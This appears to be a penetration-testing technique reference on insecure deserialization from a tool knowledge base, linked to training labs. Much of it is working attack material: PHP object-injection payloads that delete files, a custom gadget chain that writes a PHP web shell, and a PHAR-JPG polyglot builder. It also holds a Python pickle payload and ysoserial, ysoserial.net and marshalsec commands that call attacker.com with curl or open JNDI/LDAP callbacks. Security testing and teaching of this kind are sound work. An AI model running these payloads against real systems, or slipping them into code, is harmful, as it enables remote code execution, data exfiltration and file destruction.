---
id: PS-DESER
category: Insecure deserialization
lab_count: 10
wstg_refs: [WSTG-INPV-11]
---

# Insecure Deserialization: Attack Technique Reference

Insecure deserialization occurs when an application deserializes user-controllable data without adequate validation. Because deserialization reconstructs fully functional objects from byte streams, an attacker can inject modified or entirely fabricated objects that trigger dangerous behavior during or after the deserialization process. Exploitation can lead to remote code execution, privilege escalation, authentication bypass, and denial of service.

---

## 1. Detection

### 1A. Identify Serialized Object Markers

Scan cookies, hidden form fields, request bodies, API responses, and file uploads for serialization format signatures.

| Language | Format | Marker (Raw) | Marker (Base64) | Notes |
|----------|--------|--------------|-----------------|-------|
| Java | ObjectInputStream | `ac ed 00 05` (hex) | `rO0AB` | Binary format, often base64-encoded in cookies |
| PHP | serialize() | `O:4:"User"` / `a:2:{` | Varies | Human-readable, `O:` = object, `a:` = array, `s:` = string |
| .NET | BinaryFormatter | `AAEAAAD/////` | `AAEAAAD/////` | Base64-encoded, XML-based formats also common |
| .NET | ViewState | `__VIEWSTATE=` | `/wEP...` | ASP.NET form field, may be MAC-protected |
| Python | pickle | `\x80\x03` / `\x80\x04` / `\x80\x05` | `gASV` (protocol 4) | Binary, protocol version in first bytes |
| Ruby | Marshal | `\x04\x08` | `BAh` | Binary format |
| YAML | various | `!!python/object:` | N/A | Tag-based object instantiation |
| JSON | custom | `{"__type": ...}` / `{"$type": ...}` | N/A | Custom deserializers with type hints |

### 1B. Common Locations

```
# Cookies (most common vector)
Cookie: session=O%3A4%3A%22User%22%3A2%3A%7B...      # PHP serialized (URL-encoded)
Cookie: session=rO0ABXNyAB1...                        # Java serialized (base64)
Cookie: session=eyJfX3R5cGUiOi...                     # JSON with type hints (base64)

# Hidden form fields
<input type="hidden" name="__VIEWSTATE" value="/wEP..." />
<input type="hidden" name="data" value="O:4:..." />

# Request bodies
POST /api/import HTTP/1.1
Content-Type: application/x-java-serialized-object

# File uploads
uploaded.ser, uploaded.pkl, uploaded.marshal
```

### 1C. Confirmation via Manipulation

Decode the serialized object, modify a non-critical attribute, re-encode, and submit. If the application processes the modified value, it is deserializing user input.

```
# PHP: Change a boolean attribute
Original: O:4:"User":2:{s:4:"name";s:6:"carlos";s:7:"isAdmin";b:0;}
Modified: O:4:"User":2:{s:4:"name";s:6:"carlos";s:7:"isAdmin";b:1;}
# If you gain admin access, deserialization is confirmed

# Java: Use ysoserial URLDNS chain for DNS-only confirmation
java -jar ysoserial.jar URLDNS "http://COLLABORATOR.oastify.com" | base64
# If you receive a DNS lookup, the application deserializes the input
```

---

## 2. Techniques

### 2A. PHP Object Injection

PHP's `unserialize()` reconstructs objects and automatically invokes magic methods during and after the process. By crafting serialized objects of classes available in the application, attackers trigger dangerous behavior in these magic methods.

**PHP Magic Methods (ordered by invocation during deserialization):**

| Method | Invoked When | Attack Use |
|--------|-------------|------------|
| `__wakeup()` | Called immediately during `unserialize()` | Re-initialization logic, DB queries, file operations |
| `__destruct()` | Called when the object is garbage-collected (including after deserialization fails) | File deletion, command execution in cleanup code |
| `__toString()` | Called when the object is used as a string | File reads, SQL queries triggered by string conversion |
| `__call()` | Called when an undefined method is invoked on the object | Method routing that can reach dangerous sinks |
| `__get()` / `__set()` | Called when accessing undefined properties | Property access chains that reach file/DB operations |
| `__invoke()` | Called when the object is used as a function | Callback execution chains |

**Attribute modification (privilege escalation):**

```php
// Original cookie (URL-decoded then base64-decoded):
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

// Modify admin flag:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

// Re-encode and submit as cookie
```

> Lab refs: PS-DESER-01

**Data type juggling (PHP loose comparison bypass):**

PHP's loose comparison operator `==` treats `0 == "any-string"` as true (the string is cast to integer 0). If the application compares a password field using `==`, setting the password to integer 0 bypasses authentication.

```php
// Original:
O:4:"User":2:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"abc123def456..."}

// Modify access_token from string to integer 0:
O:4:"User":2:{s:8:"username";s:6:"carlos";s:12:"access_token";i:0;}

// If code does: if ($user->access_token == $stored_token) → always true
```

> Lab refs: PS-DESER-02

**Exploiting application functionality via object attributes:**

If the application uses object attributes in file operations (e.g., a user's avatar path), modifying that path can delete or read arbitrary files.

```php
// If __destruct() deletes $this->avatar_path:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:11:"avatar_path";s:23:"/home/carlos/morale.txt";}

// Submitting and letting the object be destroyed deletes the target file
```

> Lab refs: PS-DESER-03

**Arbitrary object injection (using application classes):**

When source code or error messages reveal class names, inject objects of a class with a dangerous magic method. The class does not need to be the expected type; PHP instantiates whatever class is specified in the serialized data.

```php
// If class CustomTemplate has __destruct() that calls unlink($this->lock_file_path):
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

> Lab refs: PS-DESER-04

### 2B. Java Deserialization

Java's `ObjectInputStream.readObject()` deserializes byte streams into objects. The class's `readObject()` method (if defined) executes during deserialization, acting as a magic method. Gadget chains in common libraries (Apache Commons Collections, Spring, etc.) allow arbitrary command execution.

**Detection with URLDNS (no library dependency):**

```bash
# URLDNS triggers a DNS lookup without needing any specific library
java -jar ysoserial.jar URLDNS "http://COLLABORATOR.oastify.com" | base64 -w0

# JRMPClient triggers a TCP connection
java -jar ysoserial.jar JRMPClient "attacker.com:1099" | base64 -w0
```

Submit the base64-encoded payload as the session cookie or in the appropriate input field. A DNS/TCP callback confirms deserialization.

**Exploitation with ysoserial gadget chains:**

```bash
# Apache Commons Collections (most common)
java -jar ysoserial.jar CommonsCollections1 'rm /home/carlos/morale.txt' | base64 -w0
java -jar ysoserial.jar CommonsCollections4 'curl http://attacker.com/$(whoami)' | base64 -w0

# Spring Framework
java -jar ysoserial.jar Spring1 'id' | base64 -w0

# Common chains to try (in order of prevalence):
# CommonsCollections1-7, CommonsCollections1-4 (for CC 4.x)
# Spring1, Spring2
# Groovy1
# BeanShell1
# Jdk7u21 (no external library needed, JDK 7u21 and earlier)
```

**Identifying available libraries:**

Check error messages, HTTP response headers, and stack traces for library versions. Libraries to look for:
- `commons-collections` (3.x or 4.x)
- `spring-core`, `spring-beans`
- `groovy-all`
- `bsh` (BeanShell)

> Lab refs: PS-DESER-05

### 2C. PHP Pre-Built Gadget Chains (PHPGGC)

PHPGGC is the PHP equivalent of ysoserial, providing pre-built gadget chains for common PHP frameworks.

```bash
# List available gadget chains
phpggc -l

# Generate payload for specific framework
phpggc Laravel/RCE1 system 'id' -b          # Base64 output
phpggc Symfony/RCE4 exec 'id'               # Raw output
phpggc WordPress/RCE1 system 'whoami'       # WordPress

# Common frameworks with chains:
# Laravel: Laravel/RCE1-10
# Symfony: Symfony/RCE1-7
# WordPress: WordPress/RCE1-2
# Magento: Magento/SQLI1, Magento/FW1
# Doctrine: Doctrine/RCE1-2
# Guzzle: Guzzle/RCE1
# Monolog: Monolog/RCE1-8
# Slim: Slim/RCE1
# Yii: Yii/RCE1-2
```

**Identifying PHP framework:**
- Check response headers (`X-Powered-By`, `Set-Cookie` names)
- Check for framework-specific files (`/vendor/autoload.php`, `/artisan`, `/symfony.lock`)
- Error pages often reveal framework name and version

> Lab refs: PS-DESER-06

### 2D. Ruby Deserialization

Ruby's `Marshal.load()` deserializes objects and invokes initialization methods. Exploit using documented gadget chains that chain method calls to reach command execution.

**Universal Deserializer gadget chain:**

```ruby
# Generate a Ruby Marshal payload that executes a command
# This uses the universal deserializer approach documented by Elttam

require 'base64'

# Gadget chain for Ruby 2.x (Gem::Requirement + Gem::StubSpecification)
payload = Marshal.dump(
  # ... chain construction ...
)
puts Base64.strict_encode64(payload)
```

For automated generation, use framework-specific exploit scripts or the Rynix Deserialization Scanner extension.

**Identification:** Ruby Marshal data starts with `\x04\x08` (raw) or `BAh` (base64).

> Lab refs: PS-DESER-07

### 2E. Custom Gadget Chain Construction

When no pre-built chain works (the application does not use a vulnerable library version), construct a custom chain from the application's own classes. This requires access to source code.

**Methodology:**

1. **Find the entry point (kick-off gadget):** Identify classes with magic methods (`__wakeup`, `__destruct`, `__toString` in PHP; `readObject` in Java) that are invoked during deserialization.

2. **Trace the call chain:** From the magic method, follow method calls and property accesses. Each step should call a method on a controllable object property, allowing you to specify which class handles the next call.

3. **Reach a dangerous sink:** The chain must terminate at a method that performs a dangerous operation:
   - File operations: `file_get_contents()`, `fwrite()`, `unlink()`, `include()`
   - Command execution: `exec()`, `system()`, `passthru()`, `Runtime.exec()`
   - Code evaluation: `eval()`, `assert()`, `preg_replace()` with `/e`
   - SQL queries: `query()`, `execute()`

4. **Control the arguments:** Ensure the sink's arguments come from serialized object properties that you control.

**Example chain (PHP):**

```
CustomTemplate.__wakeup()
  → calls $this->logger->log($this->message)
  → if $this->logger is a FileWriter object, log() calls fwrite($this->path, $data)
  → set $this->path to "/var/www/html/shell.php", $data to "<?php system($_GET['c']); ?>"
```

Serialized payload:
```php
O:14:"CustomTemplate":2:{s:6:"logger";O:10:"FileWriter":1:{s:4:"path";s:25:"/var/www/html/shell.php";}s:7:"message";s:35:"<?php system($_GET['c']); ?>";}
```

> Lab refs: PS-DESER-08, PS-DESER-09

### 2F. PHAR Deserialization (PHP)

PHP's `phar://` stream wrapper implicitly calls `unserialize()` on the PHAR manifest metadata when any filesystem function processes a `phar://` path. This triggers deserialization even when `unserialize()` is not directly called on user input.

**Attack flow:**

1. Create a PHAR archive with a malicious serialized object in its metadata
2. Upload the PHAR file (disguised as an allowed file type, e.g., JPG)
3. Trigger a filesystem operation that processes the uploaded file with `phar://`

**Creating a polyglot PHAR-JPG:**

```php
<?php
// Create PHAR with malicious metadata
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');

// Set metadata to a malicious object (the gadget chain)
$phar->setMetadata(new CustomTemplate());  // Your gadget chain object

$phar->stopBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');  // Polyglot: starts with GIF magic bytes

// Rename to .jpg for upload
rename('exploit.phar', 'exploit.jpg');
?>
```

**Triggering deserialization:**

Any filesystem function that processes user-controlled paths can trigger PHAR deserialization:

```
file_exists('phar://./uploads/exploit.jpg')
file_get_contents('phar://./uploads/exploit.jpg/test.txt')
is_dir('phar://./uploads/exploit.jpg')
stat('phar://./uploads/exploit.jpg')
getimagesize('phar://./uploads/exploit.jpg')
```

If the application takes a file path from user input and passes it to any filesystem function, inject `phar://./uploads/exploit.jpg` as the path.

> Lab refs: PS-DESER-10

---

## 3. Serialization Formats

### 3A. PHP Serialization Format

```
Type Markers:
  b:1;                  → boolean (true)
  b:0;                  → boolean (false)
  i:42;                 → integer
  d:3.14;               → float/double
  s:5:"hello";          → string (length:value)
  a:2:{...}             → array (element_count:{key;value;key;value;})
  O:4:"User":2:{...}    → object (class_name_length:"class_name":property_count:{properties})
  N;                    → null
  r:2;                  → reference to element #2

Property Visibility:
  s:4:"name";           → public $name
  s:10:"\0User\0name";  → private $name (class-prefixed with null bytes)
  s:7:"\0*\0name";      → protected $name (asterisk-prefixed with null bytes)

Complete example:
  O:4:"User":3:{s:8:"username";s:6:"carlos";s:5:"admin";b:0;s:12:"\0User\0token";s:32:"abc123...";}
```

### 3B. Java Serialization Format

```
Structure:
  ac ed 00 05    → Magic bytes + version (always at the start)
  73             → TC_OBJECT
  72             → TC_CLASSDESC
  00 04          → Class name length
  55 73 65 72    → "User"
  ...            → UID, flags, field count, field descriptors, data

Base64 encoding: Always starts with "rO0AB"

Identify in traffic:
  - Content-Type: application/x-java-serialized-object
  - Cookie values starting with rO0AB
  - POST body with ac ed magic bytes
```

### 3C. .NET Serialization Formats

```
BinaryFormatter:
  Base64 starts with AAEAAAD/////
  Content-Type: application/soap+xml or custom

ViewState:
  Hidden field: __VIEWSTATE
  Base64 starts with /wEP
  May be MAC-protected (check __VIEWSTATEGENERATOR)
  Use ysoserial.net for payload generation

JSON.NET with TypeNameHandling:
  {"$type": "System.IO.FileInfo, mscorlib", "fileName": "/etc/passwd"}
  Look for $type in JSON responses indicating type metadata is preserved
```

### 3D. Python Pickle

```
Protocol markers (first byte):
  \x80\x02  → Protocol 2
  \x80\x03  → Protocol 3
  \x80\x04  → Protocol 4 (base64: gASV)
  \x80\x05  → Protocol 5

Payload generation:
  import pickle, os, base64

  class Exploit(object):
      def __reduce__(self):
          return (os.system, ('curl http://attacker.com/$(whoami)',))

  print(base64.b64encode(pickle.dumps(Exploit())))

__reduce__ method: Python's magic method for deserialization. Returns a tuple of (callable, args).
The callable is invoked with the args during unpickling.
```

---

## 4. Tool Reference

### 4A. ysoserial (Java)

```bash
# Installation (requires Java 8-11)
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package -DskipTests

# List available gadget chains
java -jar ysoserial.jar --help

# Generate payload (pipe to base64 for web injection)
java -jar ysoserial.jar CommonsCollections1 'COMMAND' | base64 -w0

# Common chains (try in order):
java -jar ysoserial.jar URLDNS "http://COLLAB.oastify.com"                    # DNS-only detection
java -jar ysoserial.jar JRMPClient "attacker.com:1099"                        # TCP detection
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/rce'    # CC 3.1
java -jar ysoserial.jar CommonsCollections4 'curl http://attacker.com/rce'    # CC 4.0
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/rce'    # CC 3.2.1+
java -jar ysoserial.jar Spring1 'curl http://attacker.com/rce'               # Spring
java -jar ysoserial.jar Groovy1 'curl http://attacker.com/rce'               # Groovy
```

### 4B. PHPGGC (PHP)

```bash
# Installation
git clone https://github.com/ambionics/phpggc.git

# List all available chains
./phpggc -l

# Generate payload
./phpggc Laravel/RCE1 system 'id'           # Raw output
./phpggc Laravel/RCE1 system 'id' -b        # Base64
./phpggc Laravel/RCE1 system 'id' -u        # URL-encoded
./phpggc Laravel/RCE1 system 'id' -s        # Soft URL-encode (minimal)

# Generate PHAR archive with embedded gadget
./phpggc Laravel/RCE1 system 'id' -p phar -o exploit.phar

# Common framework chains:
./phpggc -l Laravel    # Laravel/RCE1 through RCE10
./phpggc -l Symfony    # Symfony/RCE1 through RCE7
./phpggc -l Monolog    # Monolog/RCE1 through RCE8
./phpggc -l Guzzle     # Guzzle/RCE1
./phpggc -l Doctrine   # Doctrine/RCE1-2
./phpggc -l WordPress  # WordPress/RCE1-2
```

### 4C. ysoserial.net (.NET)

```bash
# Generate .NET deserialization payloads
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c 'cmd /c whoami'
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c 'curl http://attacker.com'

# ViewState exploitation (requires machine key)
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c 'command' \
  --validationalg=SHA1 --validationkey=KEY --generator=GENERATOR
```

### 4D. Marshalsec (Java alternative)

```bash
# JNDI/RMI/LDAP based exploitation (for newer Java versions where ysoserial fails)
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit"
```

---

## 5. Object Marker Reference

Quick lookup for identifying serialized objects in different contexts:

| Context | PHP | Java | .NET | Python |
|---------|-----|------|------|--------|
| Cookie | `O:` or `a:` (URL-encoded) | `rO0AB` (base64) | `AAEAAAD` (base64) | `gASV` (base64) |
| Hidden field | `O:` in value attr | `rO0AB` in value attr | `__VIEWSTATE=/wEP` | Rare |
| Request body | Raw `O:4:` text | `ac ed` hex / `rO0AB` | SOAP XML / binary | `\x80` prefix |
| Content-Type | `application/x-php-serialized` | `application/x-java-serialized-object` | `application/soap+xml` | `application/python-pickle` |
| File extension | `.ser`, `.php.ser` | `.ser`, `.obj` | `.bin`, `.viewstate` | `.pkl`, `.pickle` |
| Token prefix | Plaintext `O:` or `a:` | Always `rO0AB` or hex `aced` | `/wEP` for ViewState | `gASV` for protocol 4 |

**Automated scanning:**
```bash
# Search HTTP traffic for serialization markers
grep -rn "rO0AB\|AAEAAAD\|O:[0-9]*:\"\|a:[0-9]*:{" proxy_history.txt

# Rynix plugin: Java Deserialization Scanner (detects and exploits automatically)
# Rynix plugin: PHP Object Injection Check
```
## Rynix workflow

1. `get_technique_guide` for `insecure-deserialization` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `record_finding`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `record_finding`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

